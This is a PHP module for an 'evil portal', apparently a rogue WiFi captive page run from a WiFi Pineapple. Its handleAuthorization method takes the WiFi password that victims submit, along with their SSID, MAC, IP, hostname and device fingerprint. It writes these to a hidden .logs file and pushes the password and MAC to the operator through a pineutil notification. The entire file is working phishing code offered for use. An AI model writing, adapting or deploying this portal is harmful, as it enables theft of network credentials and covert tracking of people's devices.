<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
        if (isset($_POST['password'])) {
            // $email = isset($_POST['email']) ? $_POST['email'] : 'email';
            $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
            $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
            $ssid = isset($_POST['ssid']) ? $_POST['ssid'] : 'ssid';
            $useragent = isset($_POST['useragent']) ? $_POST['useragent'] : 'unknown';
            $screenres = isset($_POST['SR']) ? $_POST['SR'] : 'unknown';
            $operatingsystem = isset($_POST['OS']) ? $_POST['OS'] : 'unknown';
            $webbrowser = isset($_POST['WB']) ? $_POST['WB'] : 'unknown';
            $architecture = isset($_POST['AT']) ? $_POST['AT'] : 'unknown';
            $cpucores = isset($_POST['CC']) ? $_POST['CC'] : 'unknown';

            $reflector = new \ReflectionClass(get_class($this));
            $logPath = dirname($reflector->getFileName());

            // New variable for the date command
            $currentDate = date('Y-m-d H:i:s');

            // Using heredoc for multiline content
            $logContent = <<<EOD
[$currentDate]
SSID: {$ssid}
Password: {$pwd}
Hostname: {$hostname}
MAC: {$mac}
IP: {$ip}
User Agent: {$useragent}
Screen Resolution: {$screenres}
OS: {$operatingsystem}
CPU Cores: {$cpucores}
Arch: {$architecture}
Web Browser: {$webbrowser}


EOD;

            file_put_contents("{$logPath}/.logs", $logContent, FILE_APPEND);
            $this->execBackground("pineutil notify 0 'Password: $pwd for MAC: $mac'");
        }

        // Handle form input or other extra things here

        // Call parent to handle basic authorization first
        parent::handleAuthorization();
    }

    /**
     * Override this to do something when the client is successfully authorized.
     * By default, it just notifies the Web UI.
     */
    public function onSuccess()
    {
        // Calls default success message
        parent::onSuccess();
    }

    /**
     * If an error occurs then do something here.
     * Override to provide your own functionality.
     */
    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}